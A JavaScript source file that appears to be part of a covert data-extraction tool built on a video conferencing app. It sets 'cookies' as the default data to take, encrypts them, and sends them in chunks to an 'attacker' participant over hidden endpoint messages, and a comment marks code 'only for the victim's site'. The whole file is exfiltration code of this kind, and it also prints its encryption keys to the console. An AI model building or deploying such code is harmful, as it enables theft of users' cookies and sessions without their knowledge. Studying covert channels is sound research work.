/* eslint-disable max-params */
/* global APP, getDefaultSettings */

import CovertReceiver from './CovertReceiver';
import CovertTransmitter from './CovertTransmitter';
import DataEncoder from './DataEncoder';

const defaultConfigurationValues = {
    //
    method: 'endpoint',

    //
    dataType: 'cookies',

    //
    chunkSize: 5000,

    //
    encryptionEnabled: true,

    //
    pingInterval: 1000,

    // If debug is true the communication will generate unique identifier of communication,
    // if false it would be default value 'extraction'
    debug: true
};


/**
 *
 */
export class CommunicationHandler {
    /**
     * @param {object} configuration - Object containing information about data extraction
     */
    constructor(configuration) {
        this.configuration = getDefaultSettings(defaultConfigurationValues, configuration);
        this.extractionEvent = new EventTarget();
        this._fileBuffer = [];
        this.communicationEnded = false;
    }

    /**
     * Setting AES key and IV
     */
    async initializeEncryption() {
        if (this.configuration.encryptionEnabled
                && !this.key && !this.iv) {
            [ this.key, this.configuration.key, this.iv ] = await DataEncoder.generateEncryption();
            console.log('KEYS GENERATED:', this.key, this.iv);

            this.configuration.iv = this.iv;
        }
    }

    /**
     * Looks if encryption is used in the communication
     * @returns {boolean}
     */
    enabledEncryption() {
        return this.configuration.encryptionEnabled
            && this.configuration.key
            && this.configuration.iv;
    }

    /**
     * getter for full file buffer
     */
    get fullData() {
        return this._fileBuffer?.length ? this._fileBuffer?.reduce((first, second) => first + second) : '';
    }

    /**
     * Receive reply data through the specified extraction method.
     * Could be either endpoint text payload data, or control info (ending message).
     * @param {*} recievedData - Data received from endpointTextMessage.
     * @param {*} event - Custom event for dispatching data when extraction ended.
     */
    receiveEndpointData(recievedData) {
        // extract data using specified method
        if (recievedData.isEnd) { // 'reply' control ending message

            // Event for downloading extracted data at the end of extraction.
            // Define custom event 'extractionEnded' and trigger it.


            console.log('DECRYPT:', recievedData.payload, this);
            DataEncoder.decrypt(this.fullData, this.key, this.iv).then(decryptedData => {
                this.extractionEvent.dispatchEvent(new CustomEvent('extractionEnded', {
                    detail: {
                        extractedData: decryptedData,
                        config: this.configuration
                    }
                }));
            });
 
            this._fileBuffer = []; // empty the file buffer after ending communication.
            this.communicationEnded = true;

        } else { // 'reply' containg text data
            this._fileBuffer.push(recievedData.payload);
        }
    }
}


/**
 * Class responsible for extraction handling
 */
export default class ExtractionHandler extends CommunicationHandler {

    /**
     *
     * @param {*} configuration
     */
    constructor(configuration) {
        super(configuration);
        this.nameOfCommunication = this.getCommunicationName();
    }

    /**
     *
     * @returns {string}
     */
    getCommunicationName() {
        return this.configuration.debug ? 'extraction' : DataEncoder.generateName();
    }

    /**
     *
     * @param {object} initiator
     */
    executeCommand(initiator) {
        initiator[initiator.getUsedMethod()]();
    }

    /**
     * This is only for the victim's site
     */
    createExtractionEndedListener(attacker) {
        this.extractionEvent.addEventListener('extractionEnded', () => {
            this.endCommunication(attacker);
        });
    }

    /**
     * Send data through the specified method.
     * @param {any} data - data to be sent.
     */
    async sendAll(data, attacker) {
        // If the method can loose data through the transition send the final size of sent file.
        this.createExtractionEndedListener(attacker);
        if (this.enabledEncryption()) {
            DataEncoder.encrypt(data, this.configuration.key, this.configuration.iv).then(encryptedData => {
                const initiator = new CovertTransmitter(attacker, this.configuration,
                        this.nameOfCommunication, this.extractionEvent, encryptedData);

                this.executeCommand(initiator);
            });
        } else {
            const initiator = new CovertTransmitter(attacker, this.configuration,
                    this.nameOfCommunication, this.extractionEvent, data);

            this.executeCommand(initiator);
        }
    }

    /**
     * Receive data through the specified extraction method.
     */
    receiveAll(user) {
        // TODO: add generic code for all types of communication.
        const mandatory = [ this.configuration, this.nameOfCommunication, this.extractionEvent ];

        console.log('receive mandatory:', ...mandatory);

        const initiator = new CovertReceiver(user, this.configuration,
                this.nameOfCommunication, this.extractionProcess, this._fileBuffer);

        this.executeCommand(initiator);
    }

    /**
     * End hidden communication between users
     */
    endCommunication(user) {
        APP.conference.sendEndpointMessage(user.getId(), {
            extraction: 'reply',
            isEnd: true
        });
        this.communicationEnded = true;
    }
}